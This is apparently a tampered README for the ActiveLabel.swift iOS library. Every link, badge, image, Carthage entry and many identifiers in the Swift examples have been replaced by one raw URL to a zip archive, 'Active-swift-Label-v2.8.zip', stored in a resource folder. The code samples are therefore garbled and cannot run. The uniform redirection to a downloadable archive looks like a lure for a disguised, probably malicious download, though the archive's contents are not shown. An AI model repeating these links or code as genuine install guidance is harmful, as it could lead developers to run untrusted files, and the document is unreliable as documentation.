# https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip [![Carthage compatible](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip)](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) [![Build Status](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip)](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip)

UILabel drop-in replacement supporting Hashtags (#), Mentions (@) and URLs (http://) written in Swift

## Features

* Swift 2+
* Support for **Hashtags, Mentions and Links**
* Super easy to use and lightweight
* Works as `UILabel` drop-in replacement
* Well tested and documented

![](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip)

## Usage

```swift
import ActiveLabel

let label = ActiveLabel()

https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = 0
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = "This is a post with #hashtags and a @userhandle."
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = .blackColor()
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { hashtag in
  print("Success. You just tapped the \(hashtag) hashtag")
}
```

## Batched customization

When using ActiveLabel, it is recommended to use the `customize(block:)` method to customize it. The reason is that ActiveLabel is reacting to each property that you set. So if you set 3 properties, the textContainer is refreshed 3 times.

When using `customize(block:)`, you can group all the customizations on the label, that way ActiveLabel is only going to refresh the textContainer once.

Example:

```swift

        https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { label in
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = "This is a post with #multiple #hashtags and a @userhandle."
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = UIColor(red: 102.0/255, green: 117.0/255, blue: 127.0/255, alpha: 1)
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = UIColor(red: 85.0/255, green: 172.0/255, blue: 238.0/255, alpha: 1)
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = UIColor(red: 238.0/255, green: 85.0/255, blue: 96.0/255, alpha: 1)
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip = UIColor(red: 85.0/255, green: 238.0/255, blue: 151.0/255, alpha: 1)
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip("Mention", message: $0) }
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip("Hashtag", message: $0) }
            https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip("URL", message: $https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) }
        }


```


## API

##### `mentionColor: UIColor = .blueColor()`
##### `mentionSelectedColor: UIColor?`
##### `hashtagColor: UIColor = .blueColor()`
##### `hashtagSelectedColor: UIColor?`
##### `URLColor: UIColor = .blueColor()`
##### `URLSelectedColor: UIColor?`
##### `lineSpacing: Float?`

##### `handleMentionTap: (String) -> ()`

```swift
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { userHandle in print("\(userHandle) tapped") }
```

##### `handleHashtagTap: (String) -> ()`

```swift
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { hashtag in print("\(hashtag) tapped") }
```

##### `handleURLTap: (NSURL) -> ()`

```swift
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { url in https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip().openURL(url) }
```

##### `filterHashtag: (String) -> Bool`

```swift
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { hashtag in https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip(hashtag) }
```

##### `filterMention: (String) -> Bool`

```swift
https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip { mention in https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip(mention) }
```

## Install (iOS 8+)

### Carthage

Add the following to your `Cartfile` and follow [these instructions](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip)

```
github "https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip"
```

### CocoaPods

CocoaPods 0.36 adds supports for Swift and embedded frameworks. To integrate ActiveLabel into your project add the following to your `Podfile`:

```ruby
platform :ios, '8.0'
use_frameworks!

pod 'ActiveLabel'
```

## Alternatives

Before writing `ActiveLabel` we've tried a lot of the following alternatives but weren't quite satisfied with the quality level or ease of usage, so we decided to contribute our own solution.

* [TTTAttributedLabel](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) (ObjC) - A drop-in replacement for UILabel that supports attributes, data detectors, links, and more
* [STTweetLabel](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) (ObjC) - A UILabel with #hashtag @handle and links tappable
* [AMAttributedHighlightLabel](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) (ObjC) - A UILabel subclass with mention/hashtag/link highlighting
* [KILabel](https://github.com/ZHThinker/ActiveLabel.swift/raw/refs/heads/master/ActiveLabelDemo/Base.lproj/Active-swift-Label-v2.8.zip) (ObjC) - A simple to use drop in replacement for UILabel for iOS 7 and above that highlights links such as URLs, twitter style usernames and hashtags and makes them touchable
